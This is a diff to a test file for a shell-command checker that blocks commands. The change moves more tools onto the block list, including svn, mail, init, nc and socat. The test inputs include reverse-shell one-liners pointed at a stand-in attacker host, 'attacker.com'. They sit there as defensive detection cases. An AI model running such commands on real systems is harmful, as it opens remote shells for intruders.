@@ -140,8 +140,8 @@ describe("CommandChecker", () => {
       expect(checker.check("dmesg")).toEqual({ allowed: true });
       expect(checker.check("journalctl -xe")).toEqual({ allowed: true });
       expect(checker.check("systemctl status sshd")).toEqual({ allowed: true });
-      expect(checker.check("service ssh status")).toEqual({ allowed: true });
-      expect(checker.check("runlevel")).toEqual({ allowed: true });
+      expect(checker.check("service ssh status")).toMatchObject({ allowed: false, blockedCommand: "service" });
+      expect(checker.check("runlevel")).toMatchObject({ allowed: false, blockedCommand: "runlevel" });
       expect(checker.check("who")).toEqual({ allowed: true });
       expect(checker.check("w")).toEqual({ allowed: true });
       expect(checker.check("last")).toEqual({ allowed: true });
@@ -179,7 +179,7 @@ describe("CommandChecker", () => {
       expect(checker.check("mesg y")).toEqual({ allowed: true });
       expect(checker.check("wall 'hello'")).toMatchObject({ allowed: false });
       expect(checker.check("write user tty")).toEqual({ allowed: true });
-      expect(checker.check("mail")).toEqual({ allowed: true });
+      expect(checker.check("mail")).toMatchObject({ allowed: false, blockedCommand: "mail" });
       expect(checker.check("nano file.txt")).toMatchObject({ allowed: false });
       expect(checker.check("vim file.txt")).toMatchObject({ allowed: false });
       expect(checker.check("rg 'pattern' .")).toEqual({ allowed: true });
@@ -191,9 +191,9 @@ describe("CommandChecker", () => {
       expect(checker.check("git show HEAD")).toEqual({ allowed: true });
       expect(checker.check("git branch")).toEqual({ allowed: true });
       expect(checker.check("git remote -v")).toEqual({ allowed: true });
-      expect(checker.check("svn status")).toEqual({ allowed: true });
-      expect(checker.check("hg status")).toEqual({ allowed: true });
-      expect(checker.check("bzr status")).toEqual({ allowed: true });
+      expect(checker.check("svn status")).toMatchObject({ allowed: false, blockedCommand: "svn" });
+      expect(checker.check("hg status")).toMatchObject({ allowed: false, blockedCommand: "hg" });
+      expect(checker.check("bzr status")).toMatchObject({ allowed: false, blockedCommand: "bzr" });
       expect(checker.check("patch --dry-run < file.patch")).toMatchObject({ allowed: false });
       expect(checker.check("colordiff file1 file2")).toEqual({ allowed: true });
       expect(checker.check("wdiff file1 file2")).toEqual({ allowed: true });
@@ -209,8 +209,8 @@ describe("CommandChecker", () => {
       expect(checker.check("scp file user@host:/tmp/")).toMatchObject({ allowed: false, blockedCommand: "scp" });
       expect(checker.check("sftp user@host")).toMatchObject({ allowed: false });
       expect(checker.check("ssh user@host")).toMatchObject({ allowed: false });
-      expect(checker.check("nc -zv host 80")).toEqual({ allowed: true });
-      expect(checker.check("socat TCP:host:80 -")).toEqual({ allowed: true });
+      expect(checker.check("nc -zv host 80")).toMatchObject({ allowed: false, blockedCommand: "nc" });
+      expect(checker.check("socat TCP:host:80 -")).toMatchObject({ allowed: false, blockedCommand: "socat" });
       expect(checker.check("nmap -sV host")).toMatchObject({ allowed: false });
       expect(checker.check("masscan -p80 host")).toMatchObject({ allowed: false });
       expect(checker.check("zmap -p 80")).toEqual({ allowed: true });
@@ -684,10 +684,10 @@ describe("CommandChecker", () => {
     });
 
     it("should detect nc/socat reverse shell", () => {
-      expect(checker.check("nc -e /bin/sh attacker.com 4444")).toMatchObject({ allowed: false });
-      expect(checker.check("socat exec:/bin/sh,pty tcp:attacker.com:4444")).toMatchObject({ allowed: false });
-      expect(checker.check("nc -zv host 80")).toEqual({ allowed: true });
-      expect(checker.check("socat TCP:host:80 -")).toEqual({ allowed: true });
+      expect(checker.check("nc -e /bin/sh attacker.com 4444")).toMatchObject({ allowed: false, blockedCommand: "nc" });
+      expect(checker.check("socat exec:/bin/sh,pty tcp:attacker.com:4444")).toMatchObject({ allowed: false, blockedCommand: "socat" });
+      expect(checker.check("nc -zv host 80")).toMatchObject({ allowed: false, blockedCommand: "nc" });
+      expect(checker.check("socat TCP:host:80 -")).toMatchObject({ allowed: false, blockedCommand: "socat" });
     });
 
     it("should detect python os.system/subprocess writes", () => {
@@ -990,10 +990,10 @@ describe("CommandChecker", () => {
       expect(checker.check("pidstat")).toEqual({ allowed: true });
     });
 
-    it("should allow more version control commands", () => {
-      expect(checker.check("svn status")).toEqual({ allowed: true });
-      expect(checker.check("hg status")).toEqual({ allowed: true });
-      expect(checker.check("bzr status")).toEqual({ allowed: true });
+    it("should block removed version control commands", () => {
+      expect(checker.check("svn status")).toMatchObject({ allowed: false, blockedCommand: "svn" });
+      expect(checker.check("hg status")).toMatchObject({ allowed: false, blockedCommand: "hg" });
+      expect(checker.check("bzr status")).toMatchObject({ allowed: false, blockedCommand: "bzr" });
     });
 
     it("should allow more calculator and search tools", () => {
@@ -1093,8 +1093,8 @@ describe("CommandChecker", () => {
     it("should allow more system utility commands", () => {
       expect(checker.check("wall 'hello'")).toMatchObject({ allowed: false });
       expect(checker.check("write user tty")).toEqual({ allowed: true });
-      expect(checker.check("mail")).toEqual({ allowed: true });
-      expect(checker.check("mutt")).toEqual({ allowed: true });
+      expect(checker.check("mail")).toMatchObject({ allowed: false, blockedCommand: "mail" });
+      expect(checker.check("mutt")).toMatchObject({ allowed: false, blockedCommand: "mutt" });
       expect(checker.check("pico file.txt")).toMatchObject({ allowed: false });
     });
 
@@ -1134,10 +1134,10 @@ describe("CommandChecker", () => {
       expect(checker.check("journalctl -xe")).toEqual({ allowed: true });
     });
 
-    it("should allow more init and runlevel commands", () => {
-      expect(checker.check("init")).toEqual({ allowed: true });
-      expect(checker.check("telinit")).toEqual({ allowed: true });
-      expect(checker.check("runlevel")).toEqual({ allowed: true });
+    it("should block removed init and runlevel commands", () => {
+      expect(checker.check("init")).toMatchObject({ allowed: false, blockedCommand: "init" });
+      expect(checker.check("telinit")).toMatchObject({ allowed: false, blockedCommand: "telinit" });
+      expect(checker.check("runlevel")).toMatchObject({ allowed: false, blockedCommand: "runlevel" });
     });
 
     it("should allow more user info commands", () => {
@@ -1384,11 +1384,11 @@ describe("CommandChecker", () => {
       expect(checker.check("ack 'pattern' .")).toEqual({ allowed: true });
     });
 
-    it("should allow more hex editing tools", () => {
+    it("should block removed hex editing tools", () => {
       expect(checker.check("hex")).toEqual({ allowed: true });
       expect(checker.check("hxd file.bin")).toEqual({ allowed: true });
-      expect(checker.check("bvi file.bin")).toEqual({ allowed: true });
-      expect(checker.check("hexedit file.bin")).toEqual({ allowed: true });
+      expect(checker.check("bvi file.bin")).toMatchObject({ allowed: false, blockedCommand: "bvi" });
+      expect(checker.check("hexedit file.bin")).toMatchObject({ allowed: false, blockedCommand: "hexedit" });
     });
 
     it("should allow more filesystem check tools", () => {
@@ -1442,8 +1442,8 @@ describe("CommandChecker", () => {
       expect(checker.check("lvconvert vg1/lv1")).toMatchObject({ allowed: false });
     });
 
-    it("should allow more service management commands", () => {
-      expect(checker.check("service ssh status")).toEqual({ allowed: true });
+    it("should block removed service management commands", () => {
+      expect(checker.check("service ssh status")).toMatchObject({ allowed: false, blockedCommand: "service" });
     });
 
     it("should block rsync and allow file transfer commands", () => {
